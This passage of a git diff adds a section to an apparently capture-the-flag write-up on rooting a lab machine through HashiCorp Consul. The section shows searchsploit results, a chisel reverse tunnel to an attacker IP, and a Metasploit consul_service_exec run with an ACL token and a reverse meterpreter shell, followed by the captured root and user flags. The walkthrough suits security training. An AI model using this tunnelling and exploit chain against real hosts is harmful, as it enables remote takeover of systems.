@@ -387,3 +387,75 @@ index 35c08f6..fc51ec0 100755
 +consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
 
 ```
+
+## Consul
+
+The best bet so far seems to use consul(port 8500) with a Metasploit method to root the machine, however, the service is not exposed
+
+
+
+* searchexploit
+
+```
+searchsploit consul                                        
+----------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                 |  Path
+----------------------------------------------------------------------------------------------- ---------------------------------
+Hashicorp Consul - Remote Command Execution via Rexec (Metasploit)                             | linux/remote/46073.rb
+Hashicorp Consul - Remote Command Execution via Services API (Metasploit)                      | linux/remote/46074.rb
+Hassan Consulting Shopping Cart 1.18 - Directory Traversal                                     | cgi/remote/20281.txt
+Hassan Consulting Shopping Cart 1.23 - Arbitrary Command Execution                             | cgi/remote/21104.pl
+PHPLeague 0.81 - '/consult/miniseul.php?cheminmini' Remote File Inclusion                      | php/webapps/28864.txt
+----------------------------------------------------------------------------------------------- -----------------------------
+```
+
+* Service
+
+```bash
+tcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN      0          38167      -                   
+```
+
+Let's use [chisel](https://github.com/jpillora/chisel) to create a tunnel between the developer user and the attacker machine
+
+* Remote machine
+
+```bash
+./chisel_1.7.7_linux_amd64 client 10.10.14.116:9999 R:8500:127.0.0.1:8500
+```
+
+* Attacker Machine
+
+```bash
+chisel server --reverse -p 9999
+```
+
+* Attacker machine Metasploit
+
+```bash
+msfconsole
+use exploit/multi/misc/consul_service_exec
+set ACL_TOKEN bb03b43b-1d81-d62b-24b5-39540ee469b5
+set RHOSTS 10.10.14.116
+set payload linux/x86/meterpreter/reverse_tcp
+set LHOST 10.10.14.116
+exploit
+```
+
+```bash
+meterpreter > sysinfo
+Computer     : 10.10.11.183
+OS           : Ubuntu 20.04 (Linux 5.4.0-126-generic)
+Architecture : x64
+BuildTuple   : i486-linux-musl
+Meterpreter  : x86/linux
+```
+
+## Flags
+
+```bash
+meterpreter > cat /root/root.txt 
+88c87210ca65763b1bc3f3f3a01f9830
+
+meterpreter > cat /home/developer/user.txt 
+8d88f4e35465bba66c9c317b6b6d2bbc
+```
